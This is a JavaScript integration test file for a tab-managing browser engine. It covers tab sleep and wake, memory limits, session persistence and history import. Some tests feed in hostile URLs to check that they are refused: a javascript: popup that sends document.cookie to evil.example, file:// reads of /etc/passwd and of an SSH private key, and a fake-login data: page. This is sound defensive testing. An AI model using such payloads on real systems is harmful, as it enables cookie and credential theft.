// Integration tests of the Engine against fake ports: the full tab lifecycle
// (create → activate → sleep → wake → close), the governor loop, persistence
// round-trips, and session restore — all offline, no Electron.
import test from 'node:test';
import assert from 'node:assert/strict';
import { Engine, STATE_FILE, SETTINGS_FILE, HISTORY_FILE } from '../../src/main/core/engine.js';
import { FakeWorld } from '../fakes/ports.js';
import { must, ok } from '../helpers.js';

/** @param {FakeWorld} [world] */
function boot(world = new FakeWorld(), settingsPatch = {}) {
  const engine = new Engine(world.ports());
  if (Object.keys(settingsPatch).length) engine.settingsSet(settingsPatch);
  return { engine, world };
}

test('navOmnibox with no active tab creates the tab in the VIEWED folder', () => {
  const { engine } = boot();
  const f = engine.folderCreate({ name: 'Research' });
  assert.ok(!('error' in f));
  const r = engine.navOmnibox({ input: 'https://paper.example/', tabId: null, folderId: f.folderId });
  assert.ok('tabId' in r, JSON.stringify(r));
  const node = must(engine.tabNode(r.tabId), 'created tab');
  assert.equal(node.parentId, f.folderId, 'tab must land inside the viewed folder, not at root');
  // A stale/bogus folderId must never fail navigation — root fallback.
  const r2 = engine.navOmnibox({ input: 'https://other.example/', tabId: null, folderId: 'gone-folder' });
  assert.ok('tabId' in r2, JSON.stringify(r2));
  assert.equal(must(engine.tabNode(r2.tabId), 'fallback tab').parentId, engine.snapshot().rootId);
});

test('navOmnibox modes: here navigates in place, new opens beside the current tab, switch jumps to the open copy', () => {
  const { engine } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const home = ok(engine.folderCreate({ name: 'Window 2' }));
  const viewed = ok(engine.folderCreate({ name: 'Elsewhere' }));
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.example/', folderId: home.folderId }));
  const count = () => engine.snapshot().tabs.length;

  // 'here' (the default whenever a tab id is given): same tab, same count.
  assert.deepEqual(engine.navOmnibox({ input: 'b.example', tabId, mode: 'here' }), { ok: true });
  assert.equal(must(engine.tabNode(tabId)).url, 'https://b.example');
  assert.equal(count(), 1);

  // 'new' with a tab showing lands NEXT TO that tab — its folder, not the
  // root and not whatever folder the sidebar happens to have selected.
  const r = engine.navOmnibox({ input: 'https://c.example/', tabId, folderId: viewed.folderId, mode: 'new' });
  assert.ok('tabId' in r, JSON.stringify(r));
  assert.equal(must(engine.tabNode(r.tabId)).parentId, home.folderId, 'new tab must sit beside the current one');
  assert.equal(engine.snapshot().activeTabId, r.tabId, 'the new tab is shown');
  assert.equal(count(), 2);

  // 'switch': the page is already open in the first tab (trailing-slash and
  // hash differences ignored) — activate it, create nothing.
  assert.deepEqual(engine.navOmnibox({ input: 'b.example/#top', tabId: r.tabId, mode: 'switch' }), { ok: true, switched: tabId });
  assert.equal(engine.snapshot().activeTabId, tabId);
  assert.equal(count(), 2);

  // 'switch' with no open copy falls back to the default: navigate the given tab…
  assert.deepEqual(engine.navOmnibox({ input: 'https://d.example/', tabId, mode: 'switch' }), { ok: true });
  assert.equal(must(engine.tabNode(tabId)).url, 'https://d.example/');
  assert.equal(count(), 2);
  // …and with no tab showing, a new tab in the viewed folder.
  const r2 = engine.navOmnibox({ input: 'https://e.example/', tabId: null, folderId: viewed.folderId, mode: 'switch' });
  assert.ok('tabId' in r2, JSON.stringify(r2));
  assert.equal(must(engine.tabNode(r2.tabId)).parentId, viewed.folderId);
  assert.equal(count(), 3);

  // 'here' with no tab to navigate is a new tab too — never an error.
  const r3 = engine.navOmnibox({ input: 'https://f.example/', tabId: null, mode: 'here' });
  assert.ok('tabId' in r3, JSON.stringify(r3));
  assert.equal(count(), 4);
});

test('navOp hardReload reaches the view (cache-bypassing reload)', () => {
  const { engine, world } = boot();
  const r = ok(engine.tabCreate({ url: 'https://stale.example/' }));
  assert.deepEqual(engine.navOp({ tabId: r.tabId }, 'hardReload'), { ok: true });
  assert.ok(world.ops.includes(`hardReload:${r.tabId}`), `ops=${world.ops}`);
});

test('find in page: drives the view, emits results, cycles matches; asleep tab errors', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://text.example/' }));
  assert.deepEqual(engine.findStart({ tabId, text: 'needle', newSession: true }), { ok: true });
  assert.ok(world.ops.includes(`find:${tabId}:needle:new`), `ops=${world.ops}`);
  engine.findStart({ tabId, text: 'needle', forward: true });
  engine.findStart({ tabId, text: 'needle', forward: true });
  engine.findStart({ tabId, text: 'needle', forward: true }); // 3 matches -> wraps
  engine.findStart({ tabId, text: 'needle', forward: false }); // and back
  const ords = world.events.filter((e) => e.type === 'findResult').map((e) => e.activeMatchOrdinal);
  assert.deepEqual(ords, [1, 2, 3, 1, 3], `ordinals=${ords}`);
  assert.ok(world.events.filter((e) => e.type === 'findResult').every((e) => e.tabId === tabId && e.matches === 3));
  assert.deepEqual(engine.findStop({ tabId }), { ok: true });
  assert.ok(world.ops.includes(`stopFind:${tabId}:clearSelection`), `ops=${world.ops}`);
  assert.deepEqual(engine.findStart({ tabId, text: '' }), { error: 'empty' });
  engine.tabSleep({ tabId });
  assert.deepEqual(engine.findStart({ tabId, text: 'x' }), { error: 'not running' });
  assert.deepEqual(engine.findStop({ tabId }), { ok: true }, 'stopping a find on an asleep tab is a quiet ok');
});

test('sidebarSet forwards visibility to the views port', () => {
  const { engine, world } = boot();
  assert.equal(world.sidebarVisible, true);
  assert.deepEqual(engine.sidebarSet({ visible: false }), { ok: true });
  assert.equal(world.sidebarVisible, false);
  engine.sidebarSet({ visible: true });
  assert.equal(world.sidebarVisible, true);
});

test('overlaySet raises and lowers the chrome via the views port', () => {
  const { engine, world } = boot();
  assert.equal(world.chromeOnTop, false);
  assert.deepEqual(engine.overlaySet({ active: true }), { ok: true });
  assert.equal(world.chromeOnTop, true);
  engine.overlaySet({ active: false });
  assert.equal(world.chromeOnTop, false);
  engine.overlaySet({}); // missing flag lowers, never throws
  assert.equal(world.chromeOnTop, false);
});

test('create + activate runs a renderer and marks active', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  const snap = engine.snapshot();
  const t = must(snap.tabs.find((x) => x.id === tabId));
  assert.equal(t.state, 'active');
  assert.equal(snap.activeTabId, tabId);
  assert.equal(must(world.viewsByTab.get(tabId)).attached, true);
  assert.equal(snap.stats.runningCount, 1);
});

test('switching tabs detaches the old view, captures its thumbnail', async () => {
  const { engine, world } = boot();
  const { tabId: a } = ok(engine.tabCreate({ url: 'https://a.com' }));
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  await Promise.resolve(); // let captureThumb promise settle
  const va = must(world.viewsByTab.get(a));
  const vb = must(world.viewsByTab.get(b));
  assert.equal(va.attached, false);
  assert.equal(vb.attached, true);
  assert.ok(va.thumbCaptures >= 1, 'outgoing tab thumbnailed');
  const snap = engine.snapshot();
  assert.equal(must(snap.tabs.find((t) => t.id === a)).state, 'running');
  assert.equal(must(snap.tabs.find((t) => t.id === b)).state, 'active');
});

test('manual sleep destroys the renderer and keeps the node', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  engine.tabSleep({ tabId });
  assert.equal(must(world.viewsByTab.get(tabId)).destroyed, true);
  const snap = engine.snapshot();
  const t = must(snap.tabs.find((x) => x.id === tabId));
  assert.equal(t.state, 'asleep');
  assert.equal(t.memMB, null);
  assert.equal(snap.activeTabId, null);
  assert.equal(snap.stats.runningCount, 0);
});

test('sleep preserves navigation history; wake restores it', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com/1' }));
  const view1 = must(world.viewsByTab.get(tabId));
  view1.loadURL('https://a.com/2');
  view1.loadURL('https://a.com/3');
  engine.tabSleep({ tabId });
  assert.ok(must(engine.tabNode(tabId)).navJson, 'navJson saved at sleep');

  engine.tabActivate({ tabId }); // wake
  const view2 = must(world.viewsByTab.get(tabId));
  assert.notEqual(view2, view1, 'a fresh renderer was created');
  assert.equal(view2.history.length, 3, 'history restored');
  assert.equal(view2.historyIndex, 2);
  const t = must(engine.snapshot().tabs.find((x) => x.id === tabId));
  assert.equal(t.state, 'active');
  assert.equal(t.canGoBack, true);
});

test('governor cap: opening beyond maxLiveTabs sleeps the LRU tab', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 2 });
  const { tabId: a } = ok(engine.tabCreate({ url: 'https://a.com' }));
  world.advanceMinutes(1);
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  world.advanceMinutes(1);
  const { tabId: c } = ok(engine.tabCreate({ url: 'https://c.com' }));
  const snap = engine.snapshot();
  assert.equal(must(snap.tabs.find((t) => t.id === a)).state, 'asleep', 'oldest slept');
  assert.equal(must(snap.tabs.find((t) => t.id === b)).state, 'running');
  assert.equal(must(snap.tabs.find((t) => t.id === c)).state, 'active');
  assert.ok(world.toasts().some((e) => e.kind === 'sleep'), 'user was told why');
});

test('keepAlive pin survives the cap; per-tab limit still beats it on tick', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 2 });
  const { tabId: pinned } = ok(engine.tabCreate({ url: 'https://pin.com' }));
  engine.tabSetKeepAlive({ tabId: pinned, keepAlive: true });
  world.advanceMinutes(1);
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  world.advanceMinutes(1);
  const { tabId: c } = ok(engine.tabCreate({ url: 'https://c.com' }));

  let snap = engine.snapshot();
  assert.equal(must(snap.tabs.find((t) => t.id === pinned)).state, 'running', 'pin survived');
  assert.equal(must(snap.tabs.find((t) => t.id === b)).state, 'asleep', 'unpinned LRU slept instead');

  // Now the pinned tab bloats past its own limit -> tick sleeps it anyway.
  engine.tabSetMemLimit({ tabId: pinned, memLimitMB: 500 });
  world.setTabMetrics(pinned, 900, 2);
  world.setTabMetrics(c, 100, 1);
  engine.tick();
  snap = engine.snapshot();
  assert.equal(must(snap.tabs.find((t) => t.id === pinned)).state, 'asleep', 'own limit beats keepAlive');
});

test('tick attributes metrics to tabs and flags shared processes', () => {
  const { engine, world } = boot();
  const { tabId: a } = ok(engine.tabCreate({ url: 'https://a.com' }));
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  // Force b to share a's pid (same-site scenario).
  must(world.viewsByTab.get(b)).pid = must(world.viewsByTab.get(a)).pid;
  world.setTabMetrics(a, 250, 3);
  engine.tick();
  const snap = engine.snapshot();
  const ta = must(snap.tabs.find((t) => t.id === a));
  const tb = must(snap.tabs.find((t) => t.id === b));
  assert.equal(ta.memMB, 250);
  assert.equal(tb.memMB, 250);
  assert.equal(ta.memShared, true);
  assert.equal(tb.memShared, true);
  assert.equal(snap.stats.totalMemMB, 500); // documented double-count when shared
});

test('global budget evicts LRU background tabs on tick', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10, globalBudgetMB: 500 });
  const { tabId: a } = ok(engine.tabCreate({ url: 'https://a.com' }));
  world.advanceMinutes(1);
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  world.advanceMinutes(1);
  const { tabId: c } = ok(engine.tabCreate({ url: 'https://c.com' }));
  world.setTabMetrics(a, 300, 1);
  world.setTabMetrics(b, 200, 1);
  world.setTabMetrics(c, 200, 1);
  engine.tick();
  const snap = engine.snapshot();
  assert.equal(must(snap.tabs.find((t) => t.id === a)).state, 'asleep', 'LRU slept for budget');
  assert.equal(must(snap.tabs.find((t) => t.id === b)).state, 'running');
  assert.equal(must(snap.tabs.find((t) => t.id === c)).state, 'active');
});

test('audible tab is protected from cap eviction', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 2 });
  const { tabId: music } = ok(engine.tabCreate({ url: 'https://music.com' }));
  must(world.viewsByTab.get(music)).simulateAudio(true);
  world.advanceMinutes(5);
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  world.advanceMinutes(5);
  engine.tabCreate({ url: 'https://c.com' });
  const snap = engine.snapshot();
  assert.equal(must(snap.tabs.find((t) => t.id === music)).state, 'running', 'music kept playing');
  assert.equal(must(snap.tabs.find((t) => t.id === b)).state, 'asleep');
});

test('domain rules: *.slack.com keepAlive + limit apply without per-tab flags', () => {
  const { engine, world } = boot(new FakeWorld(), {
    maxLiveTabs: 2,
    rules: [{ pattern: '*.slack.com', keepAlive: true, memLimitMB: 800 }],
  });
  const { tabId: slack } = ok(engine.tabCreate({ url: 'https://app.slack.com/client' }));
  world.advanceMinutes(1);
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  world.advanceMinutes(1);
  engine.tabCreate({ url: 'https://c.com' });
  const snap = engine.snapshot();
  const ts = must(snap.tabs.find((t) => t.id === slack));
  assert.equal(ts.state, 'running', 'rule keepAlive protected slack');
  assert.equal(ts.keepAliveEffective, true);
  assert.equal(ts.keepAlive, false, 'per-tab flag untouched');
  assert.equal(ts.memLimitMB, 800, 'rule limit surfaced');
  assert.equal(must(snap.tabs.find((t) => t.id === b)).state, 'asleep');
});

test('closing the active tab activates the most recent running tab, never wakes sleepers', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId: a } = ok(engine.tabCreate({ url: 'https://a.com' }));
  world.advanceMinutes(1);
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  world.advanceMinutes(1);
  const { tabId: c } = ok(engine.tabCreate({ url: 'https://c.com' }));
  engine.tabSleep({ tabId: a }); // a asleep, b running, c active
  engine.tabClose({ tabId: c });
  const snap = engine.snapshot();
  assert.equal(snap.activeTabId, b);
  assert.equal(must(snap.tabs.find((t) => t.id === a)).state, 'asleep');
});

test('closing the last running tab leaves grid (activeTabId null)', () => {
  const { engine } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  engine.tabClose({ tabId });
  const snap = engine.snapshot();
  assert.equal(snap.activeTabId, null);
  assert.equal(snap.tabs.length, 0);
});

test('tabReopen restores a closed tab: url, title, folder, and position', () => {
  const { engine } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { folderId } = ok(engine.folderCreate({ name: 'Work' }));
  const { tabId: first } = ok(engine.tabCreate({ url: 'https://keep.example/', folderId, activate: false }));
  const { tabId: gone } = ok(engine.tabCreate({ url: 'https://gone.example/', folderId, activate: false }));
  must(engine.tabNode(gone), 'node').title = 'The one that got away';
  engine.tabClose({ tabId: gone });
  const r = engine.tabReopen();
  assert.ok('tabId' in r, JSON.stringify(r));
  const node = must(engine.tabNode(r.tabId), 'reopened node');
  assert.equal(node.url, 'https://gone.example/');
  assert.equal(node.title, 'The one that got away');
  assert.equal(node.parentId, folderId, 'reopened tab returns to its folder');
  const parent = must(engine.snapshot().folders.find((f) => f.id === folderId));
  assert.deepEqual(parent.childIds, [first, r.tabId], 'restored at its old index');
  assert.equal(engine.snapshot().activeTabId, r.tabId, 'reopened tab is active');
});

test('tabReopen falls back to root when the folder is gone; empty stack errors', () => {
  const { engine } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { folderId } = ok(engine.folderCreate({ name: 'Doomed' }));
  const { tabId } = ok(engine.tabCreate({ url: 'https://orphan.example/', folderId, activate: false }));
  engine.tabClose({ tabId });
  engine.nodeRemove({ nodeId: folderId });
  const r = engine.tabReopen();
  assert.ok('tabId' in r, JSON.stringify(r));
  assert.equal(must(engine.tabNode(r.tabId), 'node').parentId, engine.snapshot().rootId);
  engine.tabClose({ tabId: r.tabId });
  ok(engine.tabReopen()); // that close is re-reopenable
  assert.deepEqual(engine.tabReopen(), { error: 'nothing to reopen' });
});

test('removing a folder records its tabs for reopen, newest popped first', () => {
  const { engine } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { folderId } = ok(engine.folderCreate({ name: 'Batch' }));
  ok(engine.tabCreate({ url: 'https://one.example/', folderId, activate: false }));
  ok(engine.tabCreate({ url: 'https://two.example/', folderId, activate: false }));
  engine.nodeRemove({ nodeId: folderId });
  const r1 = ok(engine.tabReopen());
  assert.equal(must(engine.tabNode(r1.tabId), 'node').url, 'https://two.example/');
  const r2 = ok(engine.tabReopen());
  assert.equal(must(engine.tabNode(r2.tabId), 'node').url, 'https://one.example/');
});

test('removing a folder closes its running tabs and deletes thumbnails', () => {
  const { engine, world } = boot();
  const { folderId } = ok(engine.folderCreate({ name: 'Work' }));
  const { tabId } = ok(engine.tabCreate({ url: 'https://w.com', folderId }));
  engine.nodeRemove({ nodeId: folderId });
  assert.equal(must(world.viewsByTab.get(tabId)).destroyed, true);
  assert.deepEqual(world.deletedThumbs, [tabId]);
  assert.equal(engine.snapshot().folders.length, 1, 'only root remains');
});

test('folderSleepAll sleeps the whole subtree', () => {
  const { engine } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { folderId } = ok(engine.folderCreate({ name: 'Research' }));
  const sub = ok(engine.folderCreate({ name: 'Deep', parentId: folderId }));
  const { tabId: t1 } = ok(engine.tabCreate({ url: 'https://1.com', folderId }));
  const { tabId: t2 } = ok(engine.tabCreate({ url: 'https://2.com', folderId: sub.folderId }));
  const { slept } = engine.folderSleepAll({ folderId });
  assert.equal(slept, 2);
  const snap = engine.snapshot();
  assert.equal(must(snap.tabs.find((t) => t.id === t1)).state, 'asleep');
  assert.equal(must(snap.tabs.find((t) => t.id === t2)).state, 'asleep');
});

test('popup (target=_blank) becomes a sibling tab', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  must(world.viewsByTab.get(tabId)).simulatePopup('https://popup.com');
  const snap = engine.snapshot();
  const popup = snap.tabs.find((t) => t.url === 'https://popup.com');
  assert.ok(popup, 'popup tab exists');
  assert.equal(popup.state, 'active');
  assert.equal(popup.parentId, snap.rootId);
});

test('popup to a dangerous scheme is refused, not opened', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  const view = must(world.viewsByTab.get(tabId));
  const before = engine.snapshot().tabs.length;

  for (const url of [
    'file:///etc/passwd',
    'javascript:fetch("https://evil.example/"+document.cookie)',
    'data:text/html,<h1>fake login</h1>',
    'chrome://settings',
    'view-source:file:///etc/passwd',
  ]) view.simulatePopup(url);

  const snap = engine.snapshot();
  assert.equal(snap.tabs.length, before, 'no tab was created for any blocked scheme');
  for (const v of world.viewsByTab.values()) {
    assert.ok(/^https?:|^raha:/.test(String(v.url)), `a view loaded ${v.url}`);
  }
  // Copy covers clicked links as well as popups since app links became
  // askable (ADR-0011) — dangerous schemes are still refused with a word to
  // the user, which is what this asserts.
  assert.ok(world.events.some((e) => e.type === 'toast' && /Blocked a link to an unsupported address/.test(e.text)),
    'the user is told the popup was blocked');
});

test('tabCreate refuses a dangerous url from the UI too', () => {
  const { engine } = boot();
  const r = engine.tabCreate({ url: 'file:///etc/passwd' });
  assert.ok('error' in r, 'tabCreate rejects file://');
  assert.equal(engine.snapshot().tabs.length, 0);
});

test('a tampered state.json url does not get loaded on wake', () => {
  const world = new FakeWorld();
  /** @type {string} */ let tabId;
  {
    const engine = new Engine(world.ports());
    tabId = ok(engine.tabCreate({ url: 'https://a.com' })).tabId;
    engine.shutdown();
  }
  // state.json is just a file on disk: rewrite it the way malware (or a
  // corrupt profile) would. Both carriers of a URL have to be covered — the
  // node's url AND the saved navigation history it restores from.
  const evil = 'file:///Users/victim/.ssh/id_rsa';
  const state = /** @type {any} */ (world.files.get(STATE_FILE));
  state.tree.nodes[tabId].url = evil;
  state.tree.nodes[tabId].navJson = JSON.stringify({ entries: [{ url: evil, title: 'x' }], index: 0 });
  world.files.set(STATE_FILE, state);

  const engine2 = new Engine(world.ports());
  engine2.tabActivate({ tabId });
  assert.equal(must(world.viewsByTab.get(tabId)).url, 'raha://home',
    'fell back to home instead of loading the local file');
});

test('history with about:blank/blob: entries survives sleep intact', () => {
  // Regression: the first cut of the scheme gate refused the whole restore if
  // ANY entry was not http/https/raha. Real sessions contain about:blank (a
  // page navigating itself) and blob: (a generated PDF), so tabs silently came
  // back with an empty back-stack — INVARIANTS #9 says history survives sleep.
  const world = new FakeWorld();
  /** @type {string} */ let tabId;
  {
    const engine = new Engine(world.ports());
    tabId = ok(engine.tabCreate({ url: 'https://a.com' })).tabId;
    engine.shutdown();
  }
  const state = /** @type {any} */ (world.files.get(STATE_FILE));
  state.tree.nodes[tabId].navJson = JSON.stringify({
    entries: [
      { url: 'https://a.com', title: 'a' },
      { url: 'about:blank', title: '' },
      { url: 'blob:https://a.com/9d5afb9c', title: 'report.pdf' },
      { url: 'https://b.com', title: 'b' },
    ],
    index: 3,
  });
  world.files.set(STATE_FILE, state);

  const engine2 = new Engine(world.ports());
  engine2.tabActivate({ tabId });
  const view = must(world.viewsByTab.get(tabId));
  assert.equal(view.history.length, 4, 'all four entries restored');
  assert.equal(view.historyIndex, 3, 'user is back where they were');
  assert.ok(engine2.snapshot().tabs.find((t) => t.id === tabId)?.canGoBack, 'back button still works');
});

test('a tampered navJson alone cannot smuggle a file:// entry into history', () => {
  const world = new FakeWorld();
  /** @type {string} */ let tabId;
  {
    const engine = new Engine(world.ports());
    tabId = ok(engine.tabCreate({ url: 'https://a.com' })).tabId;
    engine.shutdown();
  }
  const state = /** @type {any} */ (world.files.get(STATE_FILE));
  state.tree.nodes[tabId].navJson = JSON.stringify({
    entries: [{ url: 'https://a.com', title: 'a' }, { url: 'file:///etc/passwd', title: 'p' }],
    index: 1,
  });
  world.files.set(STATE_FILE, state);

  const engine2 = new Engine(world.ports());
  engine2.tabActivate({ tabId });
  const view = must(world.viewsByTab.get(tabId));
  // The dangerous entry is dropped; the legitimate one is kept, so the user
  // neither loses their history nor gets a reachable file:// back-entry.
  assert.ok(!view.history.includes('file:///etc/passwd'), 'no file:// entry in restored history');
  assert.deepEqual(view.history, ['https://a.com'], 'the safe entry survived');
});

test('a popup to a blob: url still opens — it is how sites show generated PDFs', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  const blob = 'blob:https://a.com/9d5afb9c-bc4e-4507-ae03-fc1b6e943ddc';
  must(world.viewsByTab.get(tabId)).simulatePopup(blob);
  const popup = engine.snapshot().tabs.find((t) => t.url === blob);
  assert.ok(popup, 'blob popup opened');
  assert.ok(!world.toasts().some((t) => /Blocked a popup/.test(t.text)), 'and was not reported as blocked');
});

test('renderer crash is handled: tab flips to asleep + warn toast', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  must(world.viewsByTab.get(tabId)).simulateCrash();
  const snap = engine.snapshot();
  assert.equal(must(snap.tabs.find((t) => t.id === tabId)).state, 'asleep');
  assert.ok(world.toasts().some((e) => e.kind === 'warn' && e.text.includes('crashed')));
});

test('persistence round-trip: relaunch restores tree with ALL tabs asleep', () => {
  const world = new FakeWorld();
  {
    const { engine } = boot(world, { maxLiveTabs: 10 });
    const { folderId } = engine.folderCreate({ name: 'Persist' });
    engine.tabCreate({ url: 'https://x.com', folderId });
    engine.tabCreate({ url: 'https://y.com' });
    engine.shutdown();
  }
  assert.ok(world.files.get(STATE_FILE), 'state written');
  assert.ok(world.files.get(SETTINGS_FILE), 'settings written');
  {
    const engine2 = new Engine(world.ports());
    const snap = engine2.snapshot();
    assert.equal(snap.tabs.length, 2);
    assert.ok(snap.tabs.every((t) => t.state === 'asleep'), 'cold start = zero renderers');
    assert.equal(snap.activeTabId, null);
    assert.equal(snap.settings.maxLiveTabs, 10, 'settings persisted');
    assert.ok(snap.folders.some((f) => f.name === 'Persist'));
  }
});

test('shutdown saves running tabs nav history for next-boot restore', () => {
  const world = new FakeWorld();
  const { engine } = boot(world);
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com/1' }));
  must(world.viewsByTab.get(tabId)).loadURL('https://a.com/2');
  engine.shutdown();
  const saved = world.files.get(STATE_FILE);
  const node = Object.values(saved.tree.nodes).find((n) => n.type === 'tab');
  assert.ok(node.navJson.includes('a.com/2'));

  const engine2 = new Engine(world.ports());
  engine2.tabActivate({ tabId: node.id });
  const view = must(world.viewsByTab.get(node.id));
  assert.equal(view.history.length, 2, 'history came back after full restart');
});

test('settingsSet: live cap change takes effect immediately', () => {
  const { engine } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  /** @type {string[]} */
  const ids = [];
  for (let i = 0; i < 5; i++) {
    const world = engine; void world;
    ids.push(ok(engine.tabCreate({ url: `https://site${i}.com` })).tabId);
  }
  assert.equal(engine.snapshot().stats.runningCount, 5);
  engine.settingsSet({ maxLiveTabs: 2 });
  const snap = engine.snapshot();
  assert.equal(snap.stats.runningCount, 2, 'immediately enforced');
  assert.equal(must(snap.tabs.find((t) => t.id === ids[4])).state, 'active', 'active survived');
});

test('omnibox into existing tab vs new tab', () => {
  const { engine } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  engine.navOmnibox({ input: 'example.com', tabId });
  assert.equal(must(engine.tabNode(tabId)).url, 'https://example.com');
  engine.navOmnibox({ input: 'brand new tab', tabId: null });
  const snap = engine.snapshot();
  assert.equal(snap.tabs.length, 2);
  assert.ok(snap.tabs.some((t) => t.url.includes('duckduckgo.com')));
});

test('first run: firstRun flag true only on a virgin profile', () => {
  const world = new FakeWorld();
  const e1 = new Engine(world.ports());
  assert.equal(e1.firstRun, true, 'no state file -> first run');
  e1.shutdown();
  const e2 = new Engine(world.ports());
  assert.equal(e2.firstRun, false, 'state file exists -> not first run');
});

test('first run: seedWelcome opens the tour + asleep examples, and persists', () => {
  const world = new FakeWorld();
  const engine = new Engine(world.ports());
  engine.seedWelcome();

  const snap = engine.snapshot();
  const welcome = snap.tabs.find((t) => t.url === 'raha://welcome');
  assert.ok(welcome, 'welcome tab exists');
  assert.equal(welcome.state, 'active', 'welcome tab is the active tab');
  assert.equal(snap.stats.runningCount, 1, 'ONLY the welcome tab runs');

  const tryFolder = snap.folders.find((f) => f.name === 'Try these');
  assert.ok(tryFolder, 'examples folder exists');
  const examples = snap.tabs.filter((t) => t.parentId === tryFolder.id);
  assert.equal(examples.length, 3);
  assert.ok(examples.every((t) => t.state === 'asleep'), 'examples cost nothing until clicked');
  assert.ok(examples.every((t) => t.title.length > 0), 'examples have friendly titles');

  // Persisted immediately: a crash right after first boot keeps the seed.
  assert.ok(world.files.get(STATE_FILE), 'state flushed');

  // Second boot: not first run, everything back asleep, no duplicate seed.
  engine.shutdown();
  const engine2 = new Engine(world.ports());
  assert.equal(engine2.firstRun, false);
  const snap2 = engine2.snapshot();
  assert.equal(snap2.tabs.filter((t) => t.url === 'raha://welcome').length, 1, 'no duplicate welcome');
  assert.equal(snap2.stats.runningCount, 0);
});

test('corrupted state file on boot: fresh start, no crash', () => {
  const world = new FakeWorld();
  world.files.set(STATE_FILE, { schemaVersion: 1, tree: { rootId: 'root', nodes: { root: { id: 'root', type: 'folder', parentId: null, childIds: ['ghost'], name: 'All', collapsed: false } } }, activeTabId: 'ghost' });
  const engine = new Engine(world.ports());
  assert.ok(engine.loadProblems.length > 0);
  const snap = engine.snapshot();
  assert.equal(snap.tabs.length, 0);
  assert.equal(snap.activeTabId, null);
});

// ------------------------------------------------------------------ history

/** @param {FakeWorld} world */
function seedHistorySource(world) {
  world.historySources = [{ id: 's1', browser: 'Chrome', label: 'Default', kind: 'chromium' }];
  world.historyBySource.set('s1', {
    entries: [
      { url: 'https://a.com/', title: 'A', lastVisitMs: 1_700_000_000_000, visitCount: 3 },
      { url: 'https://b.com/', title: 'B', lastVisitMs: 1_700_000_100_000, visitCount: 1 },
      { url: 'file:///etc/passwd', title: 'nope', lastVisitMs: 1_700_000_000_000, visitCount: 1 },
      { url: 'javascript:alert(1)', title: 'nope', lastVisitMs: 1_700_000_000_000, visitCount: 1 },
    ],
    problems: [],
  });
}

test('historySources lists what the importers port detects', () => {
  const { engine, world } = boot();
  seedHistorySource(world);
  assert.deepEqual(engine.historySources(), {
    sources: [{ id: 's1', browser: 'Chrome', label: 'Default', kind: 'chromium' }],
  });
});

test('historyImport keeps only web URLs, stamps the source, persists, toasts', () => {
  const { engine, world } = boot();
  seedHistorySource(world);
  const r = ok(engine.historyImport({ sourceIds: ['s1'] }));
  assert.equal(r.added, 2, 'file:// and javascript: rows dropped');
  assert.equal(r.total, 2);
  const listed = engine.historyList({});
  assert.deepEqual(listed.entries.map((e) => e.url), ['https://b.com/', 'https://a.com/']);
  const onDisk = world.files.get(HISTORY_FILE);
  assert.equal(onDisk.entries.length, 2, 'written through the persist port');
  assert.ok(world.toasts().some((t) => t.kind === 'info' && t.text.includes('2')));
});

test('historyImport is idempotent and reports importer problems', () => {
  const { engine, world } = boot();
  seedHistorySource(world);
  ok(engine.historyImport({ sourceIds: ['s1'] }));
  const again = ok(engine.historyImport({ sourceIds: ['s1', 'ghost'] }));
  assert.equal(again.added, 0, 're-import adds nothing');
  assert.equal(again.total, 2);
  assert.ok(again.problems.some((p) => p.includes('ghost')));
});

test('historyImport validates its payload', () => {
  const { engine } = boot();
  assert.deepEqual(engine.historyImport({}), { error: 'no sources selected' });
  assert.deepEqual(engine.historyImport(/** @type {any} */ ({ sourceIds: [42] })), { error: 'no sources selected' });
});

test('history without an importers port: empty sources, import unavailable', () => {
  const world = new FakeWorld();
  const ports = /** @type {any} */ (world.ports());
  delete ports.importers;
  const engine = new Engine(ports);
  assert.deepEqual(engine.historySources(), { sources: [] });
  assert.deepEqual(engine.historyImport({ sourceIds: ['s1'] }), { error: 'import unavailable' });
});

test('historyList searches url+title; historyClear empties store and disk', () => {
  const { engine, world } = boot();
  seedHistorySource(world);
  ok(engine.historyImport({ sourceIds: ['s1'] }));
  const hit = engine.historyList({ query: 'b.com' });
  assert.equal(hit.total, 1);
  assert.equal(hit.entries[0].title, 'B');
  ok(engine.historyClear());
  assert.deepEqual(engine.historyList({}), { entries: [], total: 0 });
